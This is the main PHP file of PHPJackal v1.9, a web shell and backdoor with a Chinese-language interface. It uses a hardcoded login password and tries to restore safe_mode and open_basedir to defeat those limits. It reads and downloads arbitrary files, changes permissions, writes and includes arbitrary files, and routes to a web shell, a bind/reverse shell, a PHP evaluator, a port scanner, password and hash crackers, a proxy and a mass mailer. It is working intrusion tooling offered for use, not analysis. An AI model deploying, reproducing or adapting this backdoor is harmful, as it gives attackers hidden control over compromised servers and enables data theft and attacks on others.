<?php
require './func.php';
#--设置信息--#
$login_password = '123321'; #登录密码
$IP             = array(); #允许用户 [$IP=array('192.168.100.5','192.168.100.9');]
#----------#
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);
ini_set('max_execution_time', '0'); //超时时间
ini_set('memory_limit', '9999M'); //内存限制
ini_set('output_buffering', 0); //输出缓存
set_magic_quotes_runtime(0);
if (!isset($_SERVER))
    $_SERVER =& $HTTP_SERVER_VARS;
if (!isset($_POST))
    $_POST =& $HTTP_POST_VARS;
if (!isset($_GET))
    $_GET =& $HTTP_GET_VARS;
if (!isset($_COOKIE))
    $_COOKIE =& $HTTP_COOKIE_VARS;
if (!isset($_FILES))
    $_FILES =& $HTTP_POST_FILES;
$_REQUEST = array_merge($_GET, $_POST);
if (get_magic_quotes_gpc()) {
    foreach ($_REQUEST as $key => $value)
        $_REQUEST[$key] = stripslashes($value);
}
if (count($IP) && !in_array($_SERVER['REMOTE_ADDR'], $IP))
    die('Access denied!');
header('Cache-Control: no-cache, must-revalidate');
header('Expires: Mon, 7 Aug 1987 05:00:00 GMT');
$et = '</td></tr></table>';
if (!empty($login_password)) {
    if (!empty($_REQUEST['fpassw'])) {
        if ($_REQUEST['fpassw'] == $login_password)
            setcookie('passw', md5($_REQUEST['fpassw']));
        header('Location: ' . hlinK());
    }
    if (empty($_COOKIE['passw']) || $_COOKIE['passw'] != md5($login_password))
        die("<html><meta http-equiv=Content-Type content=text/html;charset=gb2312><body><table><form method=post><tr><td>请输入密码:</td><td><input type=hidden name=seC value=about><input type=password name=fpassw></td></tr><tr><td></td><td><input type=submit value=登入></form>$et</body></html>");
}
if (!empty($_REQUEST['workingdiR']))
    chdir($_REQUEST['workingdiR']);
$disablefunctions = ini_get('disable_functions');
$disablefunctions = explode(',', $disablefunctions);
if (!empty($_REQUEST['chmoD']) && !empty($_REQUEST['modE']))
    chmod($_REQUEST['chmoD'], '0' . $_REQUEST['modE']);
if (!empty($_REQUEST['downloaD'])) {
    ob_clean();
    $dl  = $_REQUEST['downloaD'];
    $con = file_get_contents($dl);
    header('文件类型: application/octet-stream');
    header("文件位置: attachment; filename=\"$dl\";");
    header('文件长度: ' . strlen($con));
    echo $con;
    exit;
}
if (!empty($_REQUEST['imagE'])) {
    $img = $_REQUEST['imagE'];
    header('文件类型: imagE/gif');
    header("文件长度: " . filesize($img));
    header("最后修改: " . date('r', filemtime($img)));
    echo file_get_contents($img);
    exit;
}
if (!empty($_REQUEST['exT'])) {
    $ex = $_REQUEST['exT'];
    $e  = get_extension_funcs($ex);
    echo '<html><meta http-equiv=Content-Type content=text/html;charset=gb2312><head><title>' . htmlspecialchars($ex) . '</title></head><body><b>功能:</b><br>';
    foreach ($e as $k => $f) {
        $i = $k + 1;
        echo "$i)$f ";
        if (in_array($f, $disablefunctions))
            echo '<font color=red>被禁止的</font>';
        echo '<br>';
    }
    echo '</body></html>';
    exit;
}
$windows  = (substr((strtoupper(php_uname())), 0, 3) == 'WIN') ? 1 : 0;
$errorbox = "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td><b>错误: </b>";
$v        = '1.9';
$cwd      = getcwd();
$msgbox   = "<br><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td align='center'>";
$intro    = "<center><table border=0 style='border-collapse: collapse'><tr><td bgcolor='#666666'><b>脚本:</b><br>" . str_repeat('-=-', 25) . "<br><b>名称:</b> PHPJackal<br><b>Version:</b> $v<br><br><b>作者:</b><br>" . str_repeat('-=-', 25) . "<br><b>姓名:</b> NetJackal<br><b>国家:</b> 伊朗<br><b>主页:</b> <a href='http://netjackal.by.ru/' target='_blank'>http://netjackal.by.ru/</a><br><b>Email:</b> <a href='mailto:nima_501@yahoo.com?subject=PHPJackal'>nima_501@yahoo.com</a><br><br><b>汉化作者:</b><br>" . str_repeat('-=-', 25) . "<br><b>姓名:</b> 来福儿<br><b>国家:</b> 中国<br><b>主页:</b> <a href='http://www.laifuer.cn/' target='_blank'>http://www.laifuer.cn/</a><br><b>Email:</b> <a href='mailto:laifuer@gmail.com?suject=php后门'>laifuer@gmail.com</a><br><noscript>" . str_repeat('-=-', 25) . "<br><b>错误: 请打开您的浏览器的 JavaScript 支持!!!</b></noscript>$et</center>";
$footer   = "${msgbox}PHPJackal v$v - Powered By <a href='http://netjackal.by.ru/' target='_blank'>NetJackal</a> 汉化: <a href='http://www.laifuer.cn' target='_blank'>来福儿</a>$et";
$hcwd     = "<input type=hidden name=workingdiR value='$cwd'>";
$t        = "<table border=0 style='border-collapse: collapse' width='40%'><tr><td width='40%' bgcolor='#333333'>";
$crack    = "</td><td bgcolor='#333333'></td></tr><form method='POST' name=form><tr><td width='20%' bgcolor='#666666'>目录:</td><td bgcolor='#666666'><input type=text name=dictionary size=35></td></tr><tr><td width='20%' bgcolor='#808080'>目录类型:</td><td bgcolor='#808080'><input type=radio name=combo checked value=0 onClick='document.form.user.disabled = false;' style='border-width:1px;background-color:#808080;'>Simple (P)<input type=radio value=1 name=combo onClick='document.form.user.disabled = true;' style='border-width:1px;background-color:#808080;'>Combo (U:P)</td></tr><tr><td width='20%' bgcolor='#666666'>Username:</td><td bgcolor='#666666'><input type=text size=35 value=root name=user></td></tr><tr><td width='20%' bgcolor='#808080'>服务器:</td><td bgcolor='#808080'><input type=text name=target value=localhost size=35></td></tr><tr><td width='20%' bgcolor='#666666'><input type=checkbox name=loG value=1 onClick='document.form.logfilE.disabled = !document.form.logfilE.disabled;' style='border-width:1px;background-color:#666666;' checked>Log</td><td bgcolor='#666666'><input type=text name=logfilE size=25 value='" . whereistmP() . DIRECTORY_SEPARATOR . ".log'> $hcwd <input class=buttons type=submit value=Start></form>$et</center>";
$safemode = (ini_get('safe_mode') || strtolower(ini_get('safe_mode')) == 'on') ? 'ON' : 'OFF';
if ($safemode == 'ON') {
    ini_restore('safe_mode');
    ini_restore('open_basedir');
}
?>
<html>
<head>
<style>body{scrollbar-base-color: #484848; scrollbar-arrow-color: #FFFFFF; scrollbar-track-color: #969696;font-size:16px;font-family:"Arial Narrow";}Table {font-size: 15px;} .buttons{font-family:Verdana;font-size:10pt;font-weight:normal;font-style:normal;color:#FFFFFF;background-color:#555555;border-style:solid;border-width:1px;border-color:#FFFFFF;}textarea{border: 0px #000000 solid;background: #EEEEEE;color: #000000;}input{background: #EEEEEE;border-width:1px;border-style:solid;border-color:black}select{background: #EEEEEE; border: 0px #000000 none;}</style>
<meta http-equiv=Content-Type content=text/html;charset=utf8>
<script language="JavaScript" type="text/JavaScript">
function HS(box){
if(document.getElementById(box).style.display!="none"){
document.getElementById(box).style.display="none";
document.getElementById('lk').innerHTML="+";
}
else{
document.getElementById(box).style.display="";
document.getElementById('lk').innerHTML="-";
}
}
function chmoD($file){
$ch=prompt("Changing file mode["+$file+"]: ex. 777","");
if($ch != null)location.href="<?php
echo hlinK('seC=fm&workingdiR=' . addslashes($cwd) . '&chmoD=');
?>"+$file+"&modE="+$ch;
}
</script>
<title>PHPJackal [<?php
echo $cwd;
?>]</title>
</head><body text="#E2E2E2" bgcolor="#C0C0C0" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%">
<tr><td><a href=javascript:history.back(1)>[返回]</a> - <a href="<?php
echo hlinK("seC=sysinfo&workingdiR=$cwd");
?>">[信息]</a> - <a href="<?php
echo hlinK("seC=fm&workingdiR=$cwd");
?>">[文件管理器]</a> - <a href="<?php
echo hlinK("seC=edit&workingdiR=$cwd");
?>">[编辑器]</a> - <a href="<?php
echo hlinK("seC=webshell&workingdiR=$cwd");
?>">[Web shell]</a> - <a href="<?php
echo hlinK("seC=br&workingdiR=$cwd");
?>">[B/R shell]</a> - <a href="<?php
echo hlinK("seC=asm&workingdiR=$cwd");
?>">[安全模式]</a> - <a href="<?php
echo hlinK("seC=sqlcl&workingdiR=$cwd");
?>">[数据库]</a> - <a href="<?php
echo hlinK("seC=ftpc&workingdiR=$cwd");
?>">[FTP]</a> - <a href="<?php
echo hlinK("seC=mailer&workingdiR=$cwd");
?>">[邮件]</a> - <a href="<?php
echo hlinK("seC=eval&workingdiR=$cwd");
?>">[Evaler]</a> - <a href="<?php
echo hlinK("seC=sc&workingdiR=$cwd");
?>">[扫描器]</a> - <a href="<?php
echo hlinK("seC=cr&workingdiR=$cwd");
?>">[破解器]</a> - <a href="<?php
echo hlinK("seC=px&workingdiR=$cwd");
?>">[代理]</a> - <a href="<?php
echo hlinK("seC=tools&workingdiR=$cwd");
?>">[工具箱]</a> - <a href="<?php
echo hlinK("seC=calc&workingdiR=$cwd");
?>">[转换器]</a> - <a href="<?php
echo hlinK("seC=about&workingdiR=$cwd");
?>">[关于]</a> <?php
if (isset($_COOKIE['passw']))
    echo "- [<a href='" . hlinK("seC=logout") . "'>登出</a>]";
?></td></tr></table>
<hr size=1 noshade>
<?php
if (!empty($_REQUEST['seC'])) {
    switch ($_REQUEST['seC']) {
        case 'fm':
            filemanageR();
            break;
        case 'sc':
            scanneR();
            break;
        case 'phpinfo':
            phpinfo();
            break;
        case 'edit':
            if (!empty($_REQUEST['open']))
                editoR($_REQUEST['filE']);
            if (!empty($_REQUEST['Save'])) {
                $filehandle = fopen($_REQUEST['file'], 'w');
                fwrite($filehandle, $_REQUEST['edited']);
                fclose($filehandle);
            }
            if (!empty($_REQUEST['filE']))
                editoR($_REQUEST['filE']);
            else
                editoR('');
            break;
        case 'openit':
            openiT($_REQUEST['namE']);
            break;
        case 'cr':
            crackeR();
            break;
        case 'dic':
            dicmakeR();
            break;
        case 'tools':
            toolS();
            break;
        case 'hex':
            hexvieW();
            break;
        case 'img':
            showimagE($_REQUEST['filE']);
            break;
        case 'inc':
            if (file_exists($_REQUEST['filE']))
                include($_REQUEST['filE']);
            break;
        case 'hc':
            hashcrackeR();
            break;
        case 'fcr':
            formcrackeR();
            break;
        case 'auth':
            authcrackeR();
            break;
        case 'ftpc':
            ftpclienT();
            break;
        case 'eval':
            phpevaL();
            break;
        case 'snmp':
            snmpcrackeR();
            break;
        case 'px':
            pr0xy();
            break;
        case 'webshell':
            webshelL();
            break;
        case 'mailer':
            maileR();
            break;
        case 'br':
            brshelL();
            break;
        case 'asm':
            safemodE();
            break;
        case 'sqlcl':
            sqlclienT();
            break;
        case 'calc':
            calC();
            break;
        case 'sysinfo':
            sysinfO();
            break;
        case 'checksum':
            checksuM($_REQUEST['filE']);
            break;
        default:
            echo $intro;
    }
} else
    echo $intro;
echo $footer;
?></body></html>

